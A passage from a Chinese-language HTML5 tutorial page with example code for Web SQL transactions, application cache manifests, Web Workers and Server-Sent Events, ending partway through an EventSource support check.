class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span>  <br>      <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><br>      <br><span class="javascript">         <span class="hljs-keyword">var</span> db = openDatabase(<span class="hljs-string">&#x27;mydb&#x27;</span>, <span class="hljs-string">&#x27;1.0&#x27;</span>, <span class="hljs-string">&#x27;Test DB&#x27;</span>, <span class="hljs-number">2</span> * <span class="hljs-number">1024</span> * <span class="hljs-number">1024</span>);</span><br><span class="javascript">         <span class="hljs-keyword">var</span> msg;</span><br>         <br><span class="javascript">         db.transaction(<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">tx</span>) </span>&#123;</span><br><span class="javascript">            tx.executeSql(<span class="hljs-string">&#x27;CREATE TABLE IF NOT EXISTS LOGS (id unique, log)&#x27;</span>);</span><br><span class="javascript">            tx.executeSql(<span class="hljs-string">&#x27;INSERT INTO LOGS (id, log) VALUES (1, &quot;HTML5教程&quot;)&#x27;</span>);</span><br><span class="javascript">            tx.executeSql(<span class="hljs-string">&#x27;INSERT INTO LOGS (id, log) VALUES (2, &quot;https://tothefor.com/&quot;)&#x27;</span>);</span><br><span class="handlebars"><span class="xml">            msg = &#x27;<span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>数据表已创建，且插入了两条数据。<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>&#x27;;</span></span><br><span class="javascript">            <span class="hljs-built_in">document</span>.querySelector(<span class="hljs-string">&#x27;#status&#x27;</span>).innerHTML =  msg;</span><br>         &#125;);<br><br><span class="javascript">         db.transaction(<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">tx</span>) </span>&#123;</span><br><span class="javascript">              tx.executeSql(<span class="hljs-string">&#x27;DELETE FROM LOGS  WHERE id=1&#x27;</span>);</span><br><span class="handlebars"><span class="xml">              msg = &#x27;<span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>删除 id 为 1 的记录。<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>&#x27;;</span></span><br><span class="javascript">              <span class="hljs-built_in">document</span>.querySelector(<span class="hljs-string">&#x27;#status&#x27;</span>).innerHTML =  msg;</span><br>         &#125;);<br><br><span class="javascript">         db.transaction(<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">tx</span>) </span>&#123;</span><br><span class="javascript">             tx.executeSql(<span class="hljs-string">&#x27;UPDATE LOGS SET log=\&#x27;https://tothefor.com/&#x27;</span> WHERE id=<span class="hljs-number">2</span><span class="hljs-string">&#x27;);</span></span><br><span class="handlebars"><span class="xml">              msg = &#x27;<span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>更新 id 为 2 的记录。<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>&#x27;;</span></span><br><span class="javascript">              <span class="hljs-built_in">document</span>.querySelector(<span class="hljs-string">&#x27;#status&#x27;</span>).innerHTML =  msg;</span><br>         &#125;);<br><br><span class="javascript">         db.transaction(<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">tx</span>) </span>&#123;</span><br><span class="javascript">            tx.executeSql(<span class="hljs-string">&#x27;SELECT * FROM LOGS&#x27;</span>, [], <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">tx, results</span>) </span>&#123;</span><br><span class="javascript">               <span class="hljs-keyword">var</span> len = results.rows.length, i;</span><br><span class="javascript">               msg = <span class="hljs-string">&quot;&lt;p&gt;查询记录条数: &quot;</span> + len + <span class="hljs-string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="javascript">               <span class="hljs-built_in">document</span>.querySelector(<span class="hljs-string">&#x27;#status&#x27;</span>).innerHTML +=  msg;</span><br>               <br>               for (i = 0; i &lt; len; i++)&#123;<br><span class="handlebars"><span class="xml">                  msg = &quot;<span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">b</span>&gt;</span>&quot; + results.rows.item(i).log + &quot;<span class="hljs-tag">&lt;/<span class="hljs-name">b</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>&quot;;</span></span><br><span class="javascript">                  <span class="hljs-built_in">document</span>.querySelector(<span class="hljs-string">&#x27;#status&#x27;</span>).innerHTML +=  msg;</span><br>               &#125;<br><span class="javascript">            &#125;, <span class="hljs-literal">null</span>);</span><br>         &#125;);<br>         <br>      <span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>      <br>   <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br>   <br>   <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;status&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;status&quot;</span>&gt;</span>状态信息<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>   <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h2 id="4-应用程序缓存"><a href="#4-应用程序缓存" class="headerlink" title="4.应用程序缓存"></a>4.应用程序缓存</h2><p>使用 HTML5，通过创建 cache manifest 文件，可以轻松地创建 web 应用的离线版本。这意味着，你可以在没有网络连接的情况下进行访问。</p><p>应用程序缓存为应用带来三个优势：</p><blockquote><ol><li>离线浏览 - 用户可在应用离线时使用它们</li><li>速度 - 已缓存资源加载得更快</li><li>减少服务器负载 - 浏览器将只从服务器下载更新过或更改过的资源。</li></ol></blockquote><h3 id="4-1-Cache-Manifest-实例"><a href="#4-1-Cache-Manifest-实例" class="headerlink" title="4.1 Cache Manifest 实例"></a>4.1 Cache Manifest 实例</h3><p>展示带有 cache manifest 的 HTML 文档（供离线浏览）：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">HTML</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">manifest</span>=<span class="hljs-string">&quot;demo.appcache&quot;</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>The content of the document......<br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="4-2-Cache-Manifest-基础"><a href="#4-2-Cache-Manifest-基础" class="headerlink" title="4.2 Cache Manifest 基础"></a>4.2 Cache Manifest 基础</h3><p>如需启用应用程序缓存，需要在文档的&lt;html&gt; 标签中包含 manifest 属性：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">HTML</span>&gt;</span>        <br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">manifest</span>=<span class="hljs-string">&quot;demo.appcache&quot;</span>&gt;</span>        <br>...        <br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p>每个指定了 manifest 的页面在用户对其访问时都会被缓存。如果未指定 manifest 属性，则页面不会被缓存（除非在 manifest 文件中直接指定了该页面）。manifest 文件的建议的文件扩展名是：”.appcache”。</p><p>manifest 文件需要配置正确的 MIME-type，即 “text/cache-manifest”。必须在 web 服务器上进行配置。</p><h3 id="4-3-Manifest-文件"><a href="#4-3-Manifest-文件" class="headerlink" title="4.3 Manifest 文件"></a>4.3 Manifest 文件</h3><p>manifest 文件是简单的文本文件，它告知浏览器被缓存的内容（以及不缓存的内容）。</p><p>manifest 文件可分为三个部分：</p><blockquote><ul><li>CACHE MANIFEST - 在此标题下列出的文件将在首次下载后进行缓存</li><li>NETWORK - 在此标题下列出的文件需要与服务器的连接，且不会被缓存</li><li>FALLBACK - 在此标题下列出的文件规定当页面无法访问时的回退页面（比如 404 页面）</li></ul></blockquote><h3 id="4-4-CACHE-MANIFEST"><a href="#4-4-CACHE-MANIFEST" class="headerlink" title="4.4 CACHE MANIFEST"></a>4.4 CACHE MANIFEST</h3><p>第一行，CACHE MANIFEST，是必需的：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html">CACHE MANIFEST        <br>/theme.css        <br>/logo.gif        <br>/main.js<br></code></pre></div></td></tr></table></figure><p>上面的 manifest 文件列出了三个资源：一个 CSS 文件，一个 GIF 图像，以及一个 JavaScript 文件。当 manifest 文件加载后，浏览器会从网站的根目录下载这三个文件。然后，无论用户何时与因特网断开连接，这些资源依然是可用的。</p><h3 id="4-5-NETWORK"><a href="#4-5-NETWORK" class="headerlink" title="4.5 NETWORK"></a>4.5 NETWORK</h3><p>下面的 NETWORK 小节规定文件 “login.php” 永远不会被缓存，且离线时是不可用的：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html">NETWORK:        <br>login.php<br></code></pre></div></td></tr></table></figure><p>可以使用星号来指示所有其他其他资源/文件都需要因特网连接：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html">NETWORK:        <br>*<br></code></pre></div></td></tr></table></figure><h3 id="4-6-FALLBACK"><a href="#4-6-FALLBACK" class="headerlink" title="4.6 FALLBACK"></a>4.6 FALLBACK</h3><p>下面的 FALLBACK 小节规定如果无法建立因特网连接，则用 “offline.html” 替代 /html5/ 目录中的所有文件：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html">FALLBACK:       <br>/html/ /offline.html<br></code></pre></div></td></tr></table></figure><p>第一个 URI 是资源，第二个是替补。</p><h3 id="4-7-更新缓存"><a href="#4-7-更新缓存" class="headerlink" title="4.7 更新缓存"></a>4.7 更新缓存</h3><p>一旦应用被缓存，它就会保持缓存直到发生下列情况：</p><blockquote><ul><li>用户清空浏览器缓存</li><li>manifest 文件被修改（参阅下面的提示）</li><li>由程序来更新应用缓存</li></ul></blockquote><h3 id="4-8-完整的-Manifest-文件"><a href="#4-8-完整的-Manifest-文件" class="headerlink" title="4.8 完整的 Manifest 文件"></a>4.8 完整的 Manifest 文件</h3><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html">CACHE MANIFEST        <br># 2012-02-21 v1.0.0       <br>/theme.css        <br>/logo.gif        <br>/main.js        <br>        <br>NETWORK:        <br>login.php        <br>        <br>FALLBACK:       <br>/html/ /offline.html<br></code></pre></div></td></tr></table></figure><p>以 “#” 开头的是注释行，但也可满足其他用途。应用的缓存会在其 manifest 文件更改时被更新。如果您编辑了一幅图片，或者修改了一个 JavaScript 函数，这些改变都不会被重新缓存。更新注释行中的日期和版本号是一种使浏览器重新缓存文件的办法。</p><h3 id="4-9-关于应用程序缓存的说明"><a href="#4-9-关于应用程序缓存的说明" class="headerlink" title="4.9 关于应用程序缓存的说明"></a>4.9 关于应用程序缓存的说明</h3><p>请留心缓存的内容。一旦文件被缓存，则浏览器会继续展示已缓存的版本，即使您修改了服务器上的文件。为了确保浏览器更新缓存，您需要更新 manifest 文件。</p><p>浏览器对缓存数据的容量限制可能不太一样（某些浏览器设置的限制是每个站点 5MB）。</p><h2 id="5-Web-Workers"><a href="#5-Web-Workers" class="headerlink" title="5.Web Workers"></a>5.Web Workers</h2><p>web worker 是运行在后台的 JavaScript，不会影响页面的性能，更好的解释是，你可以使用web worker提供的一种简单的方法来为web内容在后台线程中运行脚本，这些线程在执行任务的过程中并不会干扰用户界面！</p><p>当在 HTML 页面中执行脚本时，页面的状态是不可响应的，直到脚本已完成。<br>web worker 是运行在后台的 JavaScript，独立于其他脚本，不会影响页面的性能。您可以继续做任何愿意做的事情：点击、选取内容等等，而此时 web worker 在后台运行。</p><h3 id="5-1-实例"><a href="#5-1-实例" class="headerlink" title="5.1 实例"></a>5.1 实例</h3><p>一个简单的 web worker，在后台计数：<br>demo_workers.js 文件代码：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html">var i=0;<br><br>function timedCount()<br>&#123;<br>    i=i+1;<br>    postMessage(i);<br>    setTimeout(&quot;timedCount()&quot;,500);<br>&#125;<br><br>timedCount(); <br></code></pre></div></td></tr></table></figure><p>完整实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>计数： <span class="hljs-tag">&lt;<span class="hljs-name">output</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;result&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">output</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">&quot;startWorker()&quot;</span>&gt;</span>开始工作<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span> <br><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">&quot;stopWorker()&quot;</span>&gt;</span>停止工作<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">strong</span>&gt;</span>注意：<span class="hljs-tag">&lt;/<span class="hljs-name">strong</span>&gt;</span> Internet Explorer 9 及更早 IE 版本浏览器不支持 Web Workers.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><br><span class="javascript"><span class="hljs-keyword">var</span> w;</span><br><br><span class="javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">startWorker</span>(<span class="hljs-params"></span>) </span>&#123;</span><br><span class="javascript">    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">typeof</span>(Worker) !== <span class="hljs-string">&quot;undefined&quot;</span>) &#123;</span><br><span class="javascript">        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">typeof</span>(w) == <span class="hljs-string">&quot;undefined&quot;</span>) &#123;</span><br><span class="javascript">            w = <span class="hljs-keyword">new</span> Worker(<span class="hljs-string">&quot;/statics/demosource/demo_workers.js&quot;</span>);</span><br>        &#125;<br><span class="javascript">        w.onmessage = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">event</span>) </span>&#123;</span><br><span class="javascript">            <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;result&quot;</span>).innerHTML = event.data;</span><br>        &#125;;<br><span class="javascript">    &#125; <span class="hljs-keyword">else</span> &#123;</span><br><span class="javascript">        <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;result&quot;</span>).innerHTML = <span class="hljs-string">&quot;抱歉，你的浏览器不支持 Web Workers...&quot;</span>;</span><br>    &#125;<br>&#125;<br><br><span class="javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">stopWorker</span>(<span class="hljs-params"></span>) </span>&#123; </span><br>    w.terminate();<br><span class="javascript">    w = <span class="hljs-literal">undefined</span>;</span><br>&#125;<br><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="5-2-检测浏览器是否支持-Web-Worker"><a href="#5-2-检测浏览器是否支持-Web-Worker" class="headerlink" title="5.2 检测浏览器是否支持 Web Worker"></a>5.2 检测浏览器是否支持 Web Worker</h3><p>在创建 web worker 之前，应该检测用户的浏览器是否支持它：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html">if(typeof(Worker)!==&quot;undefined&quot;)<br>  &#123;<br>  // 是的! Web worker 支持!<br>  // 一些代码.....<br>  &#125;<br>else<br>  &#123;<br>  // //抱歉! Web Worker 不支持<br>  &#125; <br></code></pre></div></td></tr></table></figure><p>必须先检测才能保证接下来可以顺利操作 web worker！</p><h3 id="5-3-创建-web-worker-文件"><a href="#5-3-创建-web-worker-文件" class="headerlink" title="5.3 创建 web worker 文件"></a>5.3 创建 web worker 文件</h3><p>在一个外部 JavaScript 中创建我们的 web worker。在这里，我们创建了计数脚本。该脚本存储于 “demo_workers.js” 文件中：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html">var i=0;<br><br>function timedCount()<br>&#123;<br>i=i+1;<br>postMessage(i);<br>setTimeout(&quot;timedCount()&quot;,500);<br>&#125;<br><br>timedCount(); <br></code></pre></div></td></tr></table></figure><p>以上代码中重要的部分是 postMessage() 方法 - 它用于向 HTML 页面传回一段消息。<br>web worker 通常不用于如此简单的脚本，而是用于更耗费 CPU 资源的任务。</p><h3 id="5-4-创建-Web-Worker-对象"><a href="#5-4-创建-Web-Worker-对象" class="headerlink" title="5.4 创建 Web Worker 对象"></a>5.4 创建 Web Worker 对象</h3><p>已经有了 web worker 文件，现在需要从 HTML 页面调用它。<br>下面的代码检测是否存在 worker，如果不存在，- 就会创建一个新的 web worker 对象，然后运行 “demo_workers.js” 中的代码：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html">if(typeof(w)==&quot;undefined&quot;)<br>  &#123;<br>  w=new Worker(&quot;demo_workers.js&quot;);<br>  &#125;<br></code></pre></div></td></tr></table></figure><p>然后就可以从 web worker 发送和接收消息了。</p><p>向 web worker 添加一个 “onmessage” 事件监听器：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html">w.onmessage=function(event)&#123;<br>document.getElementById(&quot;result&quot;).innerHTML=event.data;<br>&#125;; <br></code></pre></div></td></tr></table></figure><p>当 web worker 传递消息时，会执行事件监听器中的代码。event.data 中存有来自 event.data 的数据。</p><h3 id="5-5-终止-Web-Worker"><a href="#5-5-终止-Web-Worker" class="headerlink" title="5.5 终止 Web Worker"></a>5.5 终止 Web Worker</h3><p>创建 web worker 对象后，它会继续监听消息（即使在外部脚本完成之后）直到其被终止为止。如需终止 web worker，并释放浏览器/计算机资源，使用 terminate() 方法：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html">w.terminate(); <br></code></pre></div></td></tr></table></figure><h3 id="5-6-完整实例"><a href="#5-6-完整实例" class="headerlink" title="5.6 完整实例"></a>5.6 完整实例</h3><p>已经有了 .js 文件中的 Worker 代码。下面是 HTML 页面的代码：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Count numbers: <span class="hljs-tag">&lt;<span class="hljs-name">output</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;result&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">output</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">&quot;startWorker()&quot;</span>&gt;</span>Start Worker<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">&quot;stopWorker()&quot;</span>&gt;</span>Stop Worker<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><br><span class="javascript"><span class="hljs-keyword">var</span> w;</span><br><br><span class="javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">startWorker</span>(<span class="hljs-params"></span>)</span>&#123;</span><br><span class="javascript"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">typeof</span>(Worker)!==<span class="hljs-string">&quot;undefined&quot;</span>)</span><br>&#123;<br><span class="javascript">  <span class="hljs-keyword">if</span>(<span class="hljs-keyword">typeof</span>(w)==<span class="hljs-string">&quot;undefined&quot;</span>)</span><br>    &#123;<br><span class="javascript">    w=<span class="hljs-keyword">new</span> Worker(<span class="hljs-string">&quot;demo_workers.js&quot;</span>);</span><br>    &#125;<br><span class="javascript">  w.onmessage = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">event</span>) </span>&#123;</span><br><span class="javascript">    <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;result&quot;</span>).innerHTML=event.data;</span><br>  &#125;;<br>&#125;<br><span class="javascript"><span class="hljs-keyword">else</span></span><br>&#123;<br><span class="javascript"><span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;result&quot;</span>).innerHTML=<span class="hljs-string">&quot;Sorry, your browser does not support Web Workers...&quot;</span>;</span><br>&#125;<br>&#125;<br><br><span class="javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">stopWorker</span>(<span class="hljs-params"></span>)</span>&#123;</span><br>w.terminate();<br>&#125;<br><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br><br></code></pre></div></td></tr></table></figure><h3 id="5-7-Web-Workers-和-DOM"><a href="#5-7-Web-Workers-和-DOM" class="headerlink" title="5.7 Web Workers 和 DOM"></a>5.7 Web Workers 和 DOM</h3><p>由于 web worker 位于外部文件中，它们无法访问下例 JavaScript 对象：</p><ul><li>window 对象</li><li>document 对象</li><li>parent 对象</li></ul><h2 id="6-服务器发送事件-Server-Sent-Events-SSE"><a href="#6-服务器发送事件-Server-Sent-Events-SSE" class="headerlink" title="6.服务器发送事件(Server-Sent Events) SSE"></a>6.服务器发送事件(Server-Sent Events) SSE</h2><p>服务器发送事件（Server-sent Events）是基于 WebSocket 协议的一种服务器向客户端发送事件和数据的单向通讯。HTML5 服务器发送事件（server-sent event）允许网页获得来自服务器的更新。</p><h3 id="6-1-Server-Sent-事件-单向消息传递"><a href="#6-1-Server-Sent-事件-单向消息传递" class="headerlink" title="6.1 Server-Sent 事件 - 单向消息传递"></a>6.1 Server-Sent 事件 - 单向消息传递</h3><p>Server-Sent 事件指的是网页自动获取来自服务器的更新。</p><p>以前也可能做到这一点，前提是网页不得不询问是否有可用的更新。通过服务器发送事件，更新能够自动到达。</p><p>例子：Facebook/Twitter 更新、估价更新、新的博文、赛事结果等。</p><h3 id="6-2-接收-Server-Sent-事件通知"><a href="#6-2-接收-Server-Sent-事件通知" class="headerlink" title="6.2 接收 Server-Sent 事件通知"></a>6.2 接收 Server-Sent 事件通知</h3><p>EventSource 对象用于接收服务器发送事件通知：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html">var source=new EventSource(&quot;demo_sse.php&quot;);<br>source.onmessage=function(event)&#123;<br>  document.getElementById(&quot;result&quot;).innerHTML+=event.data + &quot;<span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span>&quot;;<br>  &#125;;<br></code></pre></div></td></tr></table></figure><p>解析：</p><ul><li><p>创建一个新的 EventSource 对象，然后规定发送更新的页面的 URL（本例中是 “demo_sse.php”）</p></li><li><p>每接收到一次更新，就会发生 onmessage 事件</p></li><li><p>当 onmessage 事件发生时，把已接收的数据推入 id 为 “result” 的元素中</p></li></ul><h3 id="6-3-检测-Server-Sent-事件支持"><a href="#6-3-检测-Server-Sent-事件支持" class="headerlink" title="6.3 检测 Server-Sent 事件支持"></a>6.3 检测 Server-Sent 事件支持</h3><p>检测服务器发送事件的浏览器支持情况：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html">if(typeof(EventSource)!==&quot;undefined&quot;)<br>   &#123;<br>   // 浏览器支持 Server-Sent<br>   // 一些代码.....<br>   